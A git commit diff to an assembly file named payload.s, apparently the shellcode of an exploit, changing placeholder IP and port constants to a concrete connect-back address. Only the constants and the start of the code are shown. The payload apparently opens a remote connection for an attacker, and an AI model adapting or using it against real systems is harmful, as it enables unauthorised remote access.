6a99854f6c4d06446e10a0961c76fc8f9b339e4e
Daniel <danielvrg@gmail.com>
2017-06-04 17:33:07 +0200

    ip change

--- payload.s
+++ payload.s
@@ -15,8 +15,8 @@ SYS_GETUID	equ 0x66
 AF_INET		equ 0x2
 SOCK_STREAM	equ 0x1
 
-IP		equ 0xdeadc0de	;; patched by 0xdeadbeef.c
-PORT		equ 0x1337	;; patched by 0xdeadbeef.c
+IP		equ 0x030018AC	;; patched by 0xdeadbeef.c
+PORT		equ 0xd204	;; patched by 0xdeadbeef.c
 
 _start:
 		;; save registers
